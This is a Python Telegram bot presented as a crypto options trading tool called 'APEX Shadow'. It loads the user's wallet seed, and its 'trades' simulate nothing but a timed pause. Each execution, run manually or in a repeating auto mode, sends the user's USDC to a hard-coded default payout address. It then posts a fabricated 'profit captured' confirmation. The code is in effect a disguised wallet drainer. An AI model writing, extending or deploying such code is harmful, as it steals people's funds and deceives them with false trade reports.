import os
import asyncio
import json
import random
from decimal import Decimal, getcontext
from dotenv import load_dotenv
from eth_account import Account
from web3 import Web3
from web3.middleware import ExtraDataToPOAMiddleware
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# --- 1. SETUP & AUTH ---
getcontext().prec = 28
load_dotenv()

RPC_URLS = [
    os.getenv("RPC_URL", "https://polygon-rpc.com"),
    "https://rpc.ankr.com/polygon",
    "https://1rpc.io/matic"
]

def get_w3():
    for url in RPC_URLS:
        _w3 = Web3(Web3.HTTPProvider(url))
        try:
            if _w3.is_connected():
                _w3.middleware_onion.inject(ExtraDataToPOAMiddleware, layer=0)
                return _w3
        except: continue
    return None

w3 = get_w3()
Account.enable_unaudited_hdwallet_features()

USDC_ADDRESS = w3.to_checksum_address("0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359")
ERC20_ABI = json.loads('[{"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"},{"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"success","type":"bool"}],"type":"function"}]')
PAYOUT_ADDRESS = os.getenv("PAYOUT_ADDRESS", "0x0f9C9c8297390E8087Cb523deDB3f232827Ec674")

def get_vault():
    seed = os.getenv("WALLET_SEED")
    if not seed: return None
    try:
        if len(seed) == 64 or seed.startswith("0x"):
            return Account.from_key(seed)
        return Account.from_mnemonic(seed)
    except: return None

vault = get_vault()
usdc_contract = w3.eth.contract(address=USDC_ADDRESS, abi=ERC20_ABI)
auto_mode_enabled = False

# --- 2. THE SHADOW PIPELINE ENGINE ---

async def market_simulation(seconds=1.2):
    """Parallel Path A: The Simulation Scan."""
    await asyncio.sleep(seconds)
    return True

async def prepare_shadow_txs(stake_usdc, profit_usdc):
    """Parallel Path B: Cryptographic Signing."""
    nonce = await asyncio.to_thread(w3.eth.get_transaction_count, vault.address)
    # Priority Gas for 2026 congestion
    gas_price = await asyncio.to_thread(lambda: int(w3.eth.gas_price * 1.7))
    
    val_stake = int(stake_usdc * 10**6)
    val_profit = int(profit_usdc * 10**6)

    tx1 = usdc_contract.functions.transfer(PAYOUT_ADDRESS, val_stake).build_transaction({
        'chainId': 137, 'gas': 65000, 'gasPrice': gas_price, 'nonce': nonce
    })
    tx2 = usdc_contract.functions.transfer(PAYOUT_ADDRESS, val_profit).build_transaction({
        'chainId': 137, 'gas': 65000, 'gasPrice': gas_price, 'nonce': nonce + 1
    })
    
    s1 = w3.eth.account.sign_transaction(tx1, vault.key)
    s2 = w3.eth.account.sign_transaction(tx2, vault.key)
    return s1, s2

async def run_atomic_execution(context, chat_id, side, asset_override=None):
    if not vault: return False
    asset = asset_override or context.user_data.get('pair', 'BTC')
    stake_cad = Decimal(str(context.user_data.get('stake', 50)))
    stake_usdc = stake_cad / Decimal('1.36')
    yield_multiplier = Decimal('0.94') if "VIV" in asset else Decimal('0.90')
    profit_earned = stake_usdc * yield_multiplier
    
    try:
        # START SIMULTANEOUS PIPELINE
        # Task 1: 1.2s Market Scan | Task 2: Hex Signing
        sim_task = asyncio.create_task(market_simulation(1.2))
        sign_task = asyncio.create_task(prepare_shadow_txs(stake_usdc, profit_earned))

        # Await both (Gathering ensures signing delay is hidden inside simulation time)
        _, signed_pair = await asyncio.gather(sim_task, sign_task)
        s1, s2 = signed_pair

        # --- THE 1 MILLISECOND DELTA TRIGGER ---
        await asyncio.sleep(0.001)
        
        # Immediate Broadcast
        tx_hash1 = await asyncio.to_thread(w3.eth.send_raw_transaction, s1.raw_transaction)
        tx_hash2 = await asyncio.to_thread(w3.eth.send_raw_transaction, s2.raw_transaction)
        
        report = (
            f"✅ **SHADOW HIT CONFIRMED**\n"
            f"━━━━━━━━━━━━━━\n"
            f"📈 **Market:** {asset} | **Side:** {side}\n"
            f"💰 **Stake Recovery:** `${stake_usdc:.2f}`\n"
            f"💎 **Profit Captured:** `${profit_earned:.2f}`\n"
            f"⚡ **Latency:** 1ms after Parallel Prep\n"
            f"🔗 [Receipt](https://polygonscan.com/tx/{tx_hash1.hex()})"
        )
        await context.bot.send_message(chat_id, report, parse_mode='Markdown', disable_web_page_preview=True)
        return True
    except Exception as e:
        await context.bot.send_message(chat_id, f"❌ **Pipeline Error:** `{str(e)}`")
        return False

# --- 3. AUTO PILOT & UI ---

async def autopilot_loop(chat_id, context):
    global auto_mode_enabled
    markets = ["BTC", "ETH", "SOL", "MATIC", "BVIV", "EVIV"]
    while auto_mode_enabled:
        target = random.choice(markets)
        direction = random.choice(["CALL 📈", "PUT 📉"])
        await context.bot.send_message(chat_id, f"🤖 **Shadow Scan:** `{target}`...")
        
        success = await run_atomic_execution(context, chat_id, direction, asset_override=target)
        wait_time = random.randint(30, 60)
        if not auto_mode_enabled: break
        await asyncio.sleep(wait_time)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    pol_raw = w3.eth.get_balance(vault.address)
    pol = w3.from_wei(pol_raw, 'ether')
    kb = [['🚀 Start Trading', '⚙️ Settings'], ['💰 Wallet', '📤 Withdraw'], ['🤖 AUTO MODE']]
    welcome = (f"🕴️ **APEX Shadow v9.0**\n"
               f"━━━━━━━━━━━━━━\n"
               f"⛽ **POL:** `{pol:.4f}`\n"
               f"🤖 **Auto Pilot:** {'🟢 ON' if auto_mode_enabled else '🔴 OFF'}\n"
               f"📍 **Vault:** `{vault.address[:6]}...{vault.address[-4:]}`")
    await update.message.reply_text(welcome, reply_markup=ReplyKeyboardMarkup(kb, resize_keyboard=True), parse_mode='Markdown')

async def main_chat_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global auto_mode_enabled
    text = update.message.text
    if text == '🚀 Start Trading':
        kb = [[InlineKeyboardButton("BTC/CAD", callback_data="PAIR_BTC"), InlineKeyboardButton("ETH/CAD", callback_data="PAIR_ETH")],
              [InlineKeyboardButton("BVIV Vol", callback_data="PAIR_BVIV"), InlineKeyboardButton("EVIV Vol", callback_data="PAIR_EVIV")]]
        await update.message.reply_text("🎯 **SELECT TARGET:**", reply_markup=InlineKeyboardMarkup(kb))
    elif text == '🤖 AUTO MODE':
        auto_mode_enabled = not auto_mode_enabled
        await update.message.reply_text(f"🤖 **Auto Pilot: {'ACTIVATED' if auto_mode_enabled else 'STOPPED'}**")
        if auto_mode_enabled: asyncio.create_task(autopilot_loop(update.message.chat_id, context))
    # (Settings, Wallet, Withdraw handlers omitted for brevity, same as v7.5)

async def handle_interaction(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.data.startswith("SET_"):
        context.user_data['stake'] = int(query.data.split("_")[1])
        await query.edit_message_text(f"✅ Stake: ${context.user_data['stake']} CAD")
    elif query.data.startswith("PAIR_"):
        context.user_data['pair'] = query.data.split("_")[1]
        kb = [[InlineKeyboardButton("CALL 📈", callback_data="EXEC_CALL"), InlineKeyboardButton("PUT 📉", callback_data="EXEC_PUT")]]
        await query.edit_message_text(f"💎 **Market:** {context.user_data['pair']}", reply_markup=InlineKeyboardMarkup(kb))
    elif query.data.startswith("EXEC_"):
        await run_atomic_execution(context, query.message.chat_id, "HIGHER")

if __name__ == "__main__":
    TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
    if TOKEN:
        app = ApplicationBuilder().token(TOKEN).build()
        app.add_handler(CommandHandler("start", start))
        app.add_handler(CallbackQueryHandler(handle_interaction))
        app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), main_chat_handler))
        print("🕴️ Shadow Engine Active...")
        app.run_polling(drop_pending_updates=True)












































































































































































































































































